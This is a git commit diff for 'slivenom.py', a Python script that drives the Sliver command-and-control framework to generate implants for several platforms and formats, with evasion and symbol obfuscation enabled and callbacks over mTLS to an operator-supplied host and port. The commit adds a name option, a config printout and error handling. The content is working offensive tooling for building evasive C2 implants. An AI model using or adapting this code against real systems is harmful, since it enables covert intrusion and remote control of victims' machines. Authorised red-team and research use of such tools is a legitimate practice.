7795f4ae28a539ffa56c60ac28e179f300dcc534
j <16228548+Jrhenderson11@users.noreply.github.com>
2022-10-06 10:01:20 +0100

    Update

--- slivenom.py
+++ slivenom.py
@@ -10,11 +10,13 @@
 # ./sliver-server daemon
 
 import os
+import grpc
 import asyncio
 from halo import Halo
 import argparse
 from enum import Enum
 from sliver import SliverClientConfig, SliverClient, client_pb2
+
 
 CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".sliver-client", "configs")
 CONFIG_PATH = os.path.join(CONFIG_DIR, "default.cfg")
@@ -23,6 +25,7 @@ def error(string):
     print(f'[] Error: {string}')
     exit(-1)
 
+
 async def main(args):
 
     ''' Client connect example '''
@@ -30,7 +33,12 @@ async def main(args):
     client = SliverClient(config)
     await client.connect()
 
-    name = "testimplant"
+    if args.name:
+        name = args.name
+    else:
+        #todo: generate radom name
+        name = "testimplant"
+
     evasion = True
     ObfuscateSymbols = True
 
@@ -53,19 +61,28 @@ async def main(args):
     if args.output:
         output_filename = args.output
 
-    ImplantC2 = client_pb2.ImplantC2(URL=f"mtls://{args.lhost}:{args.port}")
-    config = client_pb2.ImplantConfig(Name=name, C2=[ImplantC2], Evasion=evasion, ObfuscateSymbols=ObfuscateSymbols, Format=format_pb, GOOS=os_pb, GOARCH="amd64")
+    c2url = f"mtls://{args.lhost}:{args.port}"
+    arch = "amd64"
+    ImplantC2 = client_pb2.ImplantC2(URL=c2url)
+    config = client_pb2.ImplantConfig(Name=name, C2=[ImplantC2], Evasion=evasion, ObfuscateSymbols=ObfuscateSymbols, Format=format_pb, GOOS=os_pb, GOARCH=arch)
+
+    print("============== Config ==================")
+    print(f"   Name: {name:10s}      OS: {os_pb:7s}    ")
+    print(f"   Format: {args.format.upper():6s}         Arch: {arch:7s}    ")
+    print(f"\n        C2: {c2url:30s}")
+    print("========================================")
 
     spinner = Halo(text='Generating', spinner='dots', text_color='green')
     spinner.start()
     try:
 
         output = await client.generate(config)
-        print(output.__dict__())
+        print(output.__dict__)
+    except grpc.aio._call.AioRpcError as e:
+        error(e.details)
     except Exception as e:
         raise e
-    spinner.stop()   
-    
+    spinner.stop()
 
     print("implant generated")
     print(f"saved to {output_filename}")
@@ -82,6 +99,8 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('-f', '--format',choices=["exe", "elf", "dll", "so"], required=True, help='format to generate')
     parser.add_argument('-o', '--output', required=True , help='file to write to')
+
+    parser.add_argument('-n', '--name', help='implant name')
 
 
     parser.add_argument('-m', '--method', choices=["mtls", "https", "dll", "so"], default='mtls', help='C2 method')
